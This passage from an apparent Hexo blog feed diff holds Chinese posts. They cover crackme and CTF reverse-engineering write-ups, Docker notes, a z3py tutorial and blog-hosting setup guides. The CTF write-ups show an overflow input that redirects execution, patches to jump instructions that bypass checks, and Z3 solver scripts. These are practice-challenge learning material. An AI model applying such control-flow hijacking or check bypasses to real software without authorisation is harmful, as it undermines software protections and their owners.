rel="noopener">https://bbs.pediy.com/thread-222372.htm</a><br>这个人写的很好，很接地气，让我学会了不少。<br>我自己再来记录一下</p><h3 id="找到一块可输入地址"><a href="#找到一块可输入地址" class="headerlink" title="找到一块可输入地址"></a>找到一块可输入地址</h3><p>因为我们可以输入flag是数字和字母，而0x40是@，说一不行，我们排除0x40xxxx地址，然后开始从0x410000开始找，发先0x413131有个很奇怪的不能识别的，管他那么多，跳转到这试试。</p><h3 id="跳转到0x413131"><a href="#跳转到0x413131" class="headerlink" title="跳转到0x413131"></a>跳转到0x413131</h3><p>根据前面的溢出<br>我们前面12位随意填，因为 <strong>我们输入值在内存是以十六进制反向保存</strong> 所以我们输入11A 保存到内存就是413131<br>所以我们输入aaaabbbbcccc11A 就可以跳转到这里了。然后发现全都是跳转，可以看出好像是故意留的花指令。</p><h2 id="od-run-跟踪去花指令"><a href="#od-run-跟踪去花指令" class="headerlink" title="od run 跟踪去花指令"></a>od run 跟踪去花指令</h2><p>这题也是让我学会了od的跟踪，确实好用啊。</p><h3 id="下断413131"><a href="#下断413131" class="headerlink" title="下断413131"></a>下断413131</h3><p>这里是花指令开始的地方，我们先在40102D地址下短，打开<code>od-&gt;查看-&gt;run跟踪</code>，然后打开调试-&gt;跟踪步入，然后od会记录下从413131运行到40102D这之间的地址，方便我们查看。<img src="4.png" srcset="/img/loading.gif" alt="跟踪结果"></p><h3 id="更改花指令"><a href="#更改花指令" class="headerlink" title="更改花指令"></a>更改花指令</h3><p>因为我们输入的肯定是错误的flag 所以花指令肯定是不全的，而且肯定是不全的。我们查看花指令的413420 ，将jnz改为jz，让他跳转，继续验证，后面的也是同理，在 413420  0x41362e 都下断，修改指令，最后可以把有用指令清理出来</p><pre><code>ecx=41414141 xebx=42424242 yedx=43434343 zeax=ecx-ebx=x-yeax=eax&lt;&lt;2 = (x-y)*4eax=eax+ecx = (x-y)*4+xeax=eax+edx = (x-y)*4+x+z (x-y)*4+x+z = 0xeaf917e2eax=0+ecx=xeax=eax-ebx = x-yebx=eax=x-yeax=eax*2=(x-y)*2eax=eax+ebx=(x-y)*3eax=eax+ecx=(x-y)*3+xecx=eax=(x-y)*3+xeax=eax+edx=(x-y)*3+x+z(x-y)*3+x+z =0xe8f508c8eax=ecx=(x-y)*3+xeax=eax-edx=(x-y)*3+x-z(x-y)*3+x-z = 0xc0a3c68</code></pre><p>总结出来就是三个方程</p><pre><code>(x-y)*4+x+z = 0xeaf917e2(x-y)*3+x+z = 0xe8f508c8(x-y)*3+x-z = 0xc0a3c68</code></pre><h2 id="Z3启动"><a href="#Z3启动" class="headerlink" title="Z3启动"></a>Z3启动</h2><p>三个未知数，三个方程，应该是能有解</p><pre><code>from z3 import *import binasciis = Solver()x = Int(&#39;x&#39;)y = Int(&#39;y&#39;)z = Int(&#39;z&#39;)s.add((x-y)*4+x+z == 0xeaf917e2)s.add((x-y)*3+x+z == 0xe8f508c8)s.add((x-y)*3+x-z == 0xc0a3c68)print(s.check())res = s.model()a2 = &#39;&#39; + binascii.a2b_hex(hex(int((&#39;%s&#39;%res[x]))).replace(&#39;0x&#39;,&#39;&#39;)).decode(&#39;utf-8&#39;)[::-1]a2 += binascii.a2b_hex(hex(int((&#39;%s&#39;%res[y]))).replace(&#39;0x&#39;,&#39;&#39;)).decode(&#39;utf-8&#39;)[::-1]a2 += binascii.a2b_hex(hex(int((&#39;%s&#39;%res[z]))).replace(&#39;0x&#39;,&#39;&#39;)).decode(&#39;utf-8&#39;)[::-1]print(a2)</code></pre><p>总的来说还是很有收获，很喜欢这种题。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>z3</tag>
+      
+      <tag>花指令</tag>
+      
+      <tag>OD</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>docker 学习记录</title>
+    <link href="undefined2019/04/08/docker-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
+    <url>2019/04/08/docker-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    
+    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>本文背景操作系统：Ubuntu 16.04</p><p>今天上课就不想听老师的，就想写下自己之前没搞懂的docker，基本都是看的网上教程和官方文档</p><h2 id="认识docker"><a href="#认识docker" class="headerlink" title="认识docker"></a>认识docker</h2><p>官方文档：<a href="https://docs.docker.com/get-started/" target="_blank" rel="noopener">https://docs.docker.com/get-started/</a></p><p>优秀博客：<a href="https://zhuanlan.zhihu.com/p/22403015" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22403015</a></p><p>我这里主要根据官方文档记录下学习过程</p><h3 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h3><p>上面那篇知乎文章写的很好，详细解释了什么是docker，以及和虚拟机的区别，我这里还是给自己增强下记忆。</p><p>虚拟机是模拟抽象出了硬件，然后在虚拟出的硬件上运行新的内核系统，所以虚拟机机开机慢（包括开机自检，启动操作系统等等）</p><p>docker 我们可以理解成一个特别的进程，通过linux fork出来的一个进程，(fork出来的父进程和子进程都是一样的)，然后运用<strong>各种隔离形成‘独立进程’</strong>(这个可以看些知乎那篇文章)，docker不用安装其他操作系统，也不需要模拟kernel ，用的是本机的kernel 。</p><h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>docker 就是隔离了除内核资源外其应用层资源的进程，docker镜像的kernel和运行docker的kernel是同一个。</p><h2 id="安装使用docker"><a href="#安装使用docker" class="headerlink" title="安装使用docker"></a>安装使用docker</h2><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a><br>直接上官方文档，比我讲的清楚</p><h3 id="新建docker"><a href="#新建docker" class="headerlink" title="新建docker"></a>新建docker</h3><h4 id="1，新建文件夹"><a href="#1，新建文件夹" class="headerlink" title="1，新建文件夹"></a>1，新建文件夹</h4><p>找个合适的目录新建个文件夹，例如我这在/home/c/下新建dockertest空文件夹。</p><h4 id="2-创建dockerfile文件"><a href="#2-创建dockerfile文件" class="headerlink" title="2.创建dockerfile文件"></a>2.创建dockerfile文件</h4><p>这个是创建docker 镜像做重要的东西，主要包括你这个镜像的工作环境。我这里给官方文档解释下</p><pre><code># 每一个dickerfile都必须要一个FROM键，后面这些都是建立在这个&#39;系统&#39;上的，这些都是可以到`docker hub`上找到的FROM ubuntu# 这个是镜像的运行目录WORKDIR /app# Copy the current directory contents into the container at /app# 这是创建镜像的时候会执行的命令，主要是用于初始化docker环境RUN apt updateRUN apt install -y nginx# 将本目录下的的index.html拷贝到镜像的/var/www/html里面去COPY ./index.html /var/www/html# 暴露80端口EXPOSE 80# 创建一个环境变量ENV NAME World# Run app.py when the container launchesENTRYPOINT [&quot;/usr/sbin/nginx&quot;,&quot;-g&quot;, &quot;daemon off;&quot;]</code></pre><p>这里关于dockerfile键网上很多总结的，我就不说了。。。</p><h4 id="3-创建一个镜像的文件"><a href="#3-创建一个镜像的文件" class="headerlink" title="3. 创建一个镜像的文件"></a>3. 创建一个镜像的文件</h4><p>在本目录创建一个index.html 内容随意乱写都可以</p><h4 id="4-build一个镜像"><a href="#4-build一个镜像" class="headerlink" title="4. build一个镜像"></a>4. build一个镜像</h4><p><code>docker build --tag=friendlyhello .</code></p><p>注意命令最后的 <strong>.</strong>  运行后可以看到命令行执行步骤，一步一步在创建镜像，创建好后客户以使用docker ps -a 查看全部镜像。可以说我们的镜像就做好了。。。</p><h2 id="使用别人的镜像"><a href="#使用别人的镜像" class="headerlink" title="使用别人的镜像"></a>使用别人的镜像</h2><p>使用docker的search功能，搜索一个自己需要的镜像，会有很多结果，我们找到自己需要的，使用docker pull可以部署到本地，然后我们机可以run这个镜像，使用别人搭好的环境咯，下面用个安装bwapp案例解释：</p><h3 id="docker安装bwapp案例"><a href="#docker安装bwapp案例" class="headerlink" title="docker安装bwapp案例"></a>docker安装bwapp案例</h3><pre><code># 搜索一个名为bwapp的镜像docker search bwapp# pull到本地docker pull raesene/bwapp# 运行镜像，镜像80端口映射宿主的4000端口，宿主的/var/www/html映射到镜像的/var/www/html/aaa里面去docker run -d -p 4000:80 -v /var/www/html:/var/www/html/aaa raesene/bwapp# 列出现在运行的镜像docker ps# 创建一个新进程进入正在运行的bwapp镜像，可以修改文件docker exec -it ae3cef6a40f5 bash# 推出后关闭这个进程，但是bwapp镜像还在运行 exit# 停止镜像docker container stop ae3cef6a40f5# 删除镜像docker rmi  ae3cef6a40f5</code></pre><h4 id="删除镜像了解下"><a href="#删除镜像了解下" class="headerlink" title="删除镜像了解下"></a>删除镜像了解下</h4><pre><code>1.停止所有的container，这样才能够删除其中的images：docker stop $(docker ps -a -q)如果想要删除所有container的话再加一个指令：docker rm $(docker ps -a -q)2.查看当前有些什么imagesdocker images3.删除images，通过image的id来指定删除谁docker rmi &lt;image id&gt;想要删除untagged images，也就是那些id为&lt;None&gt;的image的话可以用docker rmi $(docker images | grep &quot;^&lt;none&gt;&quot; | awk &quot;{print $3}&quot;)要删除全部image的话docker rmi $(docker images -q)</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>Docker</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>docker</tag>
+      
+      <tag>hub</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>看雪刷题系列：2017</title>
+    <link href="undefined2019/04/04/%E7%9C%8B%E9%9B%AA%E5%88%B7%E9%A2%98%E7%B3%BB%E5%88%97%EF%BC%9A2017/"/>
+    <url>2019/04/04/%E7%9C%8B%E9%9B%AA%E5%88%B7%E9%A2%98%E7%B3%BB%E5%88%97%EF%BC%9A2017/</url>
+    
+    <content type="html"><![CDATA[<p><a href="https://ctf.pediy.com/game-fight-31.htm" target="_blank" rel="noopener">题目链接和write up</a></p><h2 id="运行调试和结果"><a href="#运行调试和结果" class="headerlink" title="运行调试和结果"></a>运行调试和结果</h2><p>就一个简单框题， vc6写的，而且作者也说没什么防护<br>我的结果是 <code>1555</code></p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>F12 搜索字符串，确实有成功提示，跳转到引用出，但发现相应函数不能F5大法，说不在函数体内，其实是因为IDA没有把这段代码认识是代码OTZ，姑且这样认为吧，我们可以手动点击函数体名，右击选择<code>Creat function</code> 就可以反编译了</p><h3 id="反编译位置"><a href="#反编译位置" class="headerlink" title="反编译位置"></a>反编译位置</h3><p>之前函数设定有点问题 ，我是在<code>.text:004011F4</code> <code>.text:004012AA</code>两个位置创建了函数，反编译出来很简单了</p><pre><code>int sub_4011F4(){  int v0; // ecx  double v1; // st7  double v2; // st6  double v3; // st6  CHAR num1; // [esp+0h] [ebp-1Ch]  char num2; // [esp+1h] [ebp-1Bh]  char num3; // [esp+2h] [ebp-1Ah]  char num4; // [esp+3h] [ebp-19h]  int v9; // [esp+18h] [ebp-4h]  int savedregs; // [esp+1Ch] [ebp+0h]  GetDlgItemTextA(hDlg, 1001, &amp;num1, 21);  Sleep(0x1F4u);  JUMPOUT(strlen(&amp;num1), 4, &amp;loc_4012CF);  JUMPOUT(num1, 48, &amp;loc_4012CF);  JUMPOUT(num2, 48, &amp;loc_4012CF);  JUMPOUT(num3, 48, &amp;loc_4012CF);  JUMPOUT(num4, 48, &amp;loc_4012CF);  JUMPOUT(num1, 49, &amp;loc_4012CF);  JUMPOUT(num2, 53, &amp;loc_4012CF);  JUMPOUT(num2 == 53, (char *)&amp;loc_401262 + 1);  JUMPOUT(num2 != 53, (char *)&amp;loc_401262 + 1);  MEMORY[0x48CACD]();  v9 = num3 - v0;                               // v0 = 0  v1 = (double)v9;  v9 = num1 - v0;  v2 = (double)v9;  v9 = num2 - v0;  v3 = v2 / (double)v9;  v9 = num4 - v0;  *(float *)&amp;v9 = (v1 - v3) * (double)v9 * 16.0;  JUMPOUT(num4, v0, (char *)sub_4012AA + 1);  JUMPOUT(num4 != v0, (char *)sub_4012AA + 1);  return sub_4012AA((int)&amp;savedregs);}</code></pre><p><code>JUMPOUT</code>就是一个判断并且。1，2 ，参数是判断条件，第三个参数是跳转地址<br>sub_4012AA地址反编译如下</p><pre><code>int __usercall sub_4012AA@&lt;eax&gt;(int a1@&lt;ebp&gt;){  int result; // eax  MEMORY[0x48CB15]();  if ( *(float *)(a1 - 4) == 384.0 ) #a1-4就是上面的v9    result = MessageBoxA(hWnd, aRegistrationSu, aCrackme2017Ctf, 0);  else    result = MessageBoxA(hWnd, Text, aCrackme2017Ctf, 0);  return result;}</code></pre><p>很简单的运算：<br>已经知道flag为4位数，第一位是1，第二位是5，并且3·4·位不能是0，这里假设第三位为x，第四位位y，最后满足：<code>(x-0.2)*y*16 = 384</code> 就好了</p><h2 id="Solver"><a href="#Solver" class="headerlink" title="Solver"></a>Solver</h2><pre><code>for x in range(1,10):    for y in range(1,10):        if ((x-0.2)*y*16 == 384 ):            print(&#39;x:{} y:{}&#39;.format(x,y))</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>逆向</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>z3py使用总结</title>
+    <link href="undefined2019/04/02/z3py%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
+    <url>2019/04/02/z3py%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
+    
+    <content type="html"><![CDATA[<p>遇到一个需要计算的题，逆向不出来，就想想使用正向求解，z3了解一下</p><h2 id="什么是z3"><a href="#什么是z3" class="headerlink" title="什么是z3"></a><a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">什么是z3</a></h2><blockquote><p>Z3 is a theorem prover from Microsoft Research. It &gt;is licensed under the MIT license.</p><p>If you are not familiar with Z3, you can start &gt;here.</p><p>Pre-built binaries for releases are available from &gt;here, and nightly builds from here.</p><p>Z3 can be built using Visual Studio, a Makefile or &gt;using CMake. It provides bindings for several &gt;programming languages.</p><p>See the release notes for notes on various stable &gt;releases of Z3.</p></blockquote><p>就是一个约束器，可以简单理解为解方程的东西。</p><p><strong><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">z3英文文档</a></strong></p><p><strong><a href="http://xj.poke8.com/?p=149" target="_blank" rel="noopener">z3翻译文档</a></strong></p><h2 id="通俗易懂"><a href="#通俗易懂" class="headerlink" title="通俗易懂"></a>通俗易懂</h2><p>z3有三种变量类型 </p><h3 id="Int型"><a href="#Int型" class="headerlink" title="Int型"></a>Int型</h3><p>这种就像是我们平常说的整型，一般简单运算都可以用这个，用运算符&lt;， &lt;=， &gt;， &gt; =， ==和 ！=来进行比较</p><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><pre><code>x = Int(&#39;x&#39;)y = Int(&#39;y&#39;)solve(x &gt; 2, y &lt; 10, x + 2*y == 7)</code></pre><h3 id="RealVal型"><a href="#RealVal型" class="headerlink" title="RealVal型"></a>RealVal型</h3><p>就是小数形式，使用的很多，</p><h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><pre><code>x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)solve(x**2 + y**2 == 3, x**3 == 2)set_option(precision=30)print &quot;Solving, and displaying result with 30 decimal places&quot;solve(x**2 + y**2 == 3, x**3 == 2)</code></pre><h3 id="BitVec型"><a href="#BitVec型" class="headerlink" title="BitVec型"></a>BitVec型</h3><p>现代CPU和主流编程语言使用固定大小的位向量进行算术运算。机器算法在Z3Py中可用Bit-Vectors来表示。<br>它实现了无符号和有符号二补数算术的精确表示，<strong>只有这个类型才可以使用异或等位运算</strong></p><h4 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h4><pre><code>x = BitVec(&#39;x&#39;, 16)y = BitVec(&#39;y&#39;, 16)print x + 2# Internal representationprint (x + 2).sexpr()# -1 is equal to 65535 for 16-bit integers print simplify(x + y - 1)# Creating bit-vector constantsa = BitVecVal(-1, 16)b = BitVecVal(65535, 16)print simplify(a == b)a = BitVecVal(-1, 32)b = BitVecVal(65535, 32)# -1 is not equal to 65535 for 32-bit integers print simplify(a == b)</code></pre><p>一些命令如下</p><table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td><code>set_option(rational_to_decimal=True)</code></td><td>设置结果全局十进制表示</td></tr><tr><td><code>set_option(precision=30)</code></td><td>设置结果小数点后位数表示</td></tr><tr><td><code>simplify</code></td><td>化简之后约束条件</td></tr><tr><td><code>assertions</code></td><td>显示全部约束条件</td></tr></tbody></table><h2 id="CTF案例"><a href="#CTF案例" class="headerlink" title="CTF案例"></a>CTF案例</h2><p><a href="https://pan.baidu.com/s/1o8QdFIE" target="_blank" rel="noopener">文件地址</a><br>主要IDA逻辑<br><img src="z3py%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/1.png" srcset="/img/loading.gif" alt></p><pre><code>from z3 import *data1 = [0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,   0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E,   0x3F, 0x40, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x7B, 0x7C,   0x7D, 0x7E]data2 = [0x72, 0xE9, 0x4D, 0xAC, 0xC1, 0xD0, 0x24, 0x6B, 0xB2, 0xF5,   0xFD, 0x45, 0x49, 0x94, 0xDC, 0x10, 0x10, 0x6B, 0xA3, 0xFB,   0x5C, 0x13, 0x17, 0xE4, 0x67, 0xFE, 0x72, 0xA1, 0xC7, 0x04,   0x2B, 0xC2, 0x9D, 0x3F, 0xA7, 0x6C, 0xE7, 0xD0, 0x90, 0x71,   0x36, 0xB3, 0xAB, 0x67, 0xBF, 0x60, 0x30, 0x3E, 0x78, 0xCD,   0x6D, 0x35, 0xC8, 0x55, 0xFF, 0xC0, 0x95, 0x62, 0xE6, 0xBB,   0x57, 0x34, 0x29, 0x0E, 0x03]s = Solver()xor_res = [0]*0x41k = [BitVec((&quot;k%s&quot;%i),8) for i in range(0x22)]for i in k:    s.add(i&gt;0x20,i&lt;0x7E)for m in range(0x22):    for n in range(0x20):        xor_res[m+n] += k[m]^data1[n]for j in range(0x41):    s.add(xor_res[j]==data2[j])print(s.check())aa = s.model()for i in range(0x22):    print(chr(int(&#39;%s&#39;%aa[k[i]])),end=&#39;&#39;)</code></pre><p>几秒解出，很方便</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>z3</tag>
+      
+      <tag>Python</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>coding+hexo配置</title>
+    <link href="undefined2019/04/01/coding-hexo%E9%85%8D%E7%BD%AE/"/>
+    <url>2019/04/01/coding-hexo%E9%85%8D%E7%BD%AE/</url>
+    
+    <content type="html"><![CDATA[<p>上一篇写的是github的博客搭建，现在记录一下在coding上搭建</p><h2 id="coding"><a href="#coding" class="headerlink" title="coding"></a>coding</h2><p>什么是coding呢？ 就是一个托管代码的地方，就是中国的github，因为github中国访问还是不稳定的，我也就就一起弄了，博客也都是一起更。</p><h3 id="注册账号"><a href="#注册账号" class="headerlink" title="注册账号"></a>注册账号</h3><p>这个之前还是把我坑了，现在被腾讯收购，就用腾讯账号登陆就可以了，还是很方便。<br>如图就可以建立一个coding项目了<img src="1.png" srcset="/img/loading.gif" alt="创建coding项目">注意启用初始化项目，否者之后创建不了page服务</p><h4 id="创建page服务"><a href="#创建page服务" class="headerlink" title="创建page服务"></a>创建page服务</h4><p>在创建好的项目-&gt;代码-&gt;page服务，打开page服务。</p><h4 id="添加ssh公钥"><a href="#添加ssh公钥" class="headerlink" title="添加ssh公钥"></a>添加ssh公钥</h4><p>在部署部署-&gt;公钥 里面添加一个公钥，公钥内容为你git创建的密钥对的公钥，也就是你C:\Users\youruserame.ssh下的id_rsa.pub文件，用记事本打开，粘贴到这来就好了。注意勾选<strong>授予推送权限</strong>，只有添加了这个公钥你才能通过git上传你的博客。</p><h3 id="以上基本上服务器端就ok了"><a href="#以上基本上服务器端就ok了" class="headerlink" title="以上基本上服务器端就ok了"></a>以上基本上服务器端就ok了</h3><h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>现在我们来配置本地文件</p><h3 id="Hexo主配置文件"><a href="#Hexo主配置文件" class="headerlink" title="Hexo主配置文件"></a>Hexo主配置文件</h3><p>将<code>_config.yml</code>配置在github篇更改为如下</p><pre><code>deploy:  type: git  repo:     github: git@github.com:L0yy/L0yy.github.io.git  #这个是我github地址    coding: git@git.dev.tencent.com:lm16310/lm1631ling.git  #这个是我的coding地址  branch: master</code></pre><p>就这样写就可以了，博客源文件我会上传github<br>基本就是这样了吧</p><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>还是老套路</p><pre><code>hexo clean hexo g -d</code></pre><p>这样输入后github和coding就会一起同时更新，是不是很方便呢。<br>第一次提交可能有点慢，但是耐心等待肯定会有好结果的。</p><p><strong>我猜你肯定会尝试访问page服务给你的地址，但是很失望，为什么页面的css和js脚本都没有运行起来呢？继续往下看吧…OTZ</strong></p><h2 id="页面乱码"><a href="#页面乱码" class="headerlink" title="页面乱码"></a>页面乱码</h2><p>因为上面的问题，看了下访问的请求，发现访问的url里面少了page服务给的后缀，我现在有如下两种解决方案</p><h3 id="修改主配置"><a href="#修改主配置" class="headerlink" title="修改主配置"></a>修改主配置</h3><p>修改主文件<code>_config.yml</code> 的root值。如果page服务给你的地址是<code>aaaaa.coding.me/XXXXXXXX</code>,你就把root值修改为<code>/XXXXXXXX/</code>,问题基本解决，但是后来你会发现之前的图片还是无法访问，其实也是这个问题，但是很麻烦，如果选择修改root值这个方法的话以后写博客就去找个图床专门保存图片，图片路径写绝对路径就好了</p><h3 id="添加域名"><a href="#添加域名" class="headerlink" title="添加域名"></a>添加域名</h3><p>后来我准备配上域名，找的是freenom，其实很坑，不知道抽什么风，其实很不推荐他，但是没有其他的选择，不建议购买域名，备案可以搞疯你。freenom注册购买域名就自己google吧，这里说说怎么配域名记录<br>打开<code>services-&gt;My Domains-&gt;manage Domain-&gt;manage Freenom DNS</code></p><p>配置如图<img src="2.png" srcset="/img/loading.gif" alt="Domain记录"><br>name就是二级域名，不能为空很烦，从今年2月开始就不行了OTZ，但也刚好方便我把两个站都放在同一个顶级域名下，至于为什么使用C和G(coding，github)我完全为了好分辨……</p><h4 id="github小改动"><a href="#github小改动" class="headerlink" title="github小改动"></a>github小改动</h4><p>需要在你的本地博客下的public文件创建一个名为CNAME的文件，内容就是你的域名，（假如你freenom注册的顶级域名为<code>XXX.tk</code>）如果是按我DNS配置的话就在CNAME里面填写<code>G.XXX.tk</code></p><h4 id="coding小改动"><a href="#coding小改动" class="headerlink" title="coding小改动"></a>coding小改动</h4><p>在page服务的设置里绑定新域名<code>C.XXX.tk</code><br>分别访问<code>G.XXX.tk</code>和<code>G.XXX.tk</code> 成了……</p><p><strong>以上两种方法任选一种，但是强烈建议第二种</strong></p><h3 id="Hexo主题一些问题"><a href="#Hexo主题一些问题" class="headerlink" title="Hexo主题一些问题"></a>Hexo主题一些问题</h3><p>后来我跟换了主题，但是在google上搜不到，要加入 <code>google_analytics</code>但是很多主题都没有预装</p><p>去<code>https://search.google.com/search-console/welcome?utm_source=about-page</code> 输入网址</p><p>1.选择 <code>Google Analytics（分析）</code>类型</p><p>2.到<a href="https://analytics.google.com/analytics/web/#/" target="_blank" rel="noopener">https://analytics.google.com/analytics/web/#/</a> 创建后注册一个账号，创建一个服务<br><img src="https://img-blog.csdnimg.cn/2019082613282688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt></p><p>3.将<a href="https://developers.google.com/analytics/devguides/collection/gtagjs/" target="_blank" rel="noopener">https://developers.google.com/analytics/devguides/collection/gtagjs/</a> 网页的全局代码复制到themes\pacman\layout_partial\head.ejs 下</p><p><img src="https://img-blog.csdnimg.cn/20190826133013781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt></p><p>4.执行hexo clean -&gt; hexo g -d 上传后</p><p>5.然后就可以去第2步网站点击验证，看是否验证成功。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>博客</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>hexo</tag>
+      
+      <tag>coding</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Github+Hexo搭建过程</title>
+    <link href="undefined2019/04/01/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/"/>
+    <url>2019/04/01/%E8%AE%B0%E5%BD%95%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%B9%8B%E6%97%85/</url>
+    
+    <content type="html"><![CDATA[<h2 id="什么是Hexo"><a href="#什么是Hexo" class="headerlink" title="什么是Hexo"></a>什么是Hexo</h2><p>可能有人还不知到什么是hexo，那么我就应用一句他自己的介绍吧</p><blockquote><p>A fast, simple &amp; powerful blog framework</p></blockquote><p>大概意思就是说这是一个静态的，快速的博客框架。</p><h2 id="我为什么要用Hexo"><a href="#我为什么要用Hexo" class="headerlink" title="我为什么要用Hexo"></a>我为什么要用Hexo</h2><p>其实是我想使用github的虚拟主机服务，可以搭建自己的博客，而且可以使用github保存代码，不怕丢失，岂不美哉。</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="%E6%95%88%E6%9E%9C%E5%9B%BE.png" srcset="/img/loading.gif" alt="效果图"><br>是不是很舒服呢？</p><h2 id="我们也来整一个"><a href="#我们也来整一个" class="headerlink" title="我们也来整一个"></a>我们也来整一个</h2><p>主要暂时使用github的服务器，coding的还没有弄好，有点麻烦，先更github的</p><h3 id="注册并配置github"><a href="#注册并配置github" class="headerlink" title="注册并配置github"></a>注册并配置github</h3><p>只要这部分可以参考<br><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">github+hexo基本搭建</a><br>我呢就简单的在记录下流程</p><h4 id="ssh密钥问题"><a href="#ssh密钥问题" class="headerlink" title="ssh密钥问题"></a>ssh密钥问题</h4><p>因为你在本地搭的博客，所以肯定要上传到服务器上，但是服务器怎么认为你是这个博客的管理员呢？就是使用ssh的公私钥，来区别是不是管理员，所以我们需要本地生成一对密钥，把我们的公钥写到我们github的项目设置里面去，等到我们连的时候他就会认识我们。<br>windows一般存放在 &gt; C:\Users\yourusername.ssh没有的话就生成一对。</p><h3 id="本地Hexo环境"><a href="#本地Hexo环境" class="headerlink" title="本地Hexo环境"></a>本地Hexo环境</h3><p>这里默认都安装上以下环境</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a><blockquote><p>如果没有可以参考<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方安装文档</a></p></blockquote></li></ul><p>Hexo官方就简单给了几个命令<br>我来介绍下</p><pre><code>npm install hexo-cli -g //安装Hexo组建hexo init blog //部署hexo到本地的blog目录cd blog //切换到blog文件夹npm install //安装拓展必备文件hexo server  开启本地Hexo服务</code></pre><p>就这么简单几句话就好了，然后就访问<a href="http://localhost:4000/就可以看到一个博客就搭好了。" target="_blank" rel="noopener">http://localhost:4000/就可以看到一个博客就搭好了。</a></p><h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>这里我很喜欢<a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">material</a>的主题，所以简单说说这个主题的安装和配置吧。<br><strong>注意：material貌似没有维护了，网站证书失效大半年也没人管，用不用自己斟酌</strong><br>切换到blog/theme 运行<br><code>git clone https://github.com/viosey/hexo-theme-material.git material</code><br>theme里面就出现新的主题了<br>需要主要的一共有两个配置文件一个主主配置文件_config.yml，另外一个是主题配置文件_config.template.yml，需要修改为_config.yml<br>我这里贴一下主配置文件，主题配置文件下面配置我更改的地方</p><pre><code>title: Blogsubtitle:description:keywords:author: Craylanguage: zh-CNtimezone:post_asset_folder: true #asset 调用图片relative_link: falsefuture: truehighlight: #代码高亮，这里关闭，在主题打开主题的代码高亮  enable: false  line_number: true  auto_detect: false  tab_replace:search:    path: search.xml    field: alltheme: materialdeploy:  type: git  repo: git@github.com:L0yy/L0yy.github.io.git  branch: master</code></pre><p>一点小问题<br>你可能会遇到安装好后启动服务<code>hexo server</code>后报大量错误，<a href="https://github.com/viosey/hexo-theme-material/issues/688" target="_blank" rel="noopener">解决方案</a>是</p><blockquote><p>1.主题文件夹下新建一个_config.yml文件，并将_config.template.yml里的配置复制到_config.yml文件。</p><p>2.修改layout/_widget/dnsprefetch.ejs文件。修改内容如下：</p><pre><code>&lt;% } else if(theme.comment.use.startsWith(&quot;disqus&quot;)) { %&gt;// to&lt;% } else if(theme.comment.use &amp;&amp; theme.comment.use.startsWith(&quot;disqus&quot;)) { %&gt;</code></pre></blockquote><h3 id="主题配置"><a 